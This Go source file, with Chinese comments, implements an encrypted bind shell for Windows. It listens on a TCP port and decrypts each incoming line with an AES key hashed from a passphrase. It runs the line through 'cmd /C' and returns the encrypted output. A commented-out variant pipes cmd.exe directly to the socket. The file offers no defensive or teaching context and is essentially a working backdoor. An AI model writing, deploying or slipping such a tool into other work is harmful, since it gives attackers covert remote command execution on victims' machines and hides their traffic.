package main

import (
	"bufio"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"

	aesplug "golang.com/golang.com/aesPlug"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Println(`Usage:go run .\main.go 127.0.0.1:9999 aeskey`)
		os.Exit(1) //0表示正常退出，其他表示异常
	}
	ipAddr := os.Args[1]
	initAeskey := os.Args[2]
	newAesKey := hashMD5(initAeskey)

	//开启端口监听
	listener, err := net.Listen("tcp", ipAddr)
	if err != nil {
		log.Fatal("Failed to create listener", err)
	}

	//等待连接
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatal("Connection failed", err)
		}
		go handleConn(conn, newAesKey)
	}

}

func handleConn(conn net.Conn, aeskey string) {
	//_, _ = conn.Write([]byte("connection succeeded.\n"))

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		ciphertext := scanner.Text()
		//fmt.Println(ciphertext)
		plaintext := aesplug.DecryptAES([]byte(aeskey), ciphertext)
		//执行命令
		cmd := exec.Command("cmd", "/C", plaintext)
		//捕获输出
		result, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println("Error executing command:", err)
		}
		//加密
		aes_result := aesplug.EncryptAES([]byte(aeskey), string(result))
		_, _ = fmt.Fprintln(conn, aes_result) //发送给客户端
	}

	//reader := strings.NewReader(plaintext)
	//var shell = "cmd.exe"
	// command := exec.Command(shell)
	// command.Env = os.Environ()
	// command.Stdin = conn
	// command.Stdout = conn
	// command.Stderr = conn
	// _ = command.Run()
}

// hashMD5原始key进行md5，在传入aes加解密
func hashMD5(input string) string {
	// 创建一个MD5哈希对象
	hasher := md5.New()

	// 将字符串写入哈希对象
	hasher.Write([]byte(input))

	// 计算MD5散列值
	hash := hasher.Sum(nil)

	// 将散列值转换为十六进制字符串并返回
	hashString := hex.EncodeToString(hash)
	return hashString
}
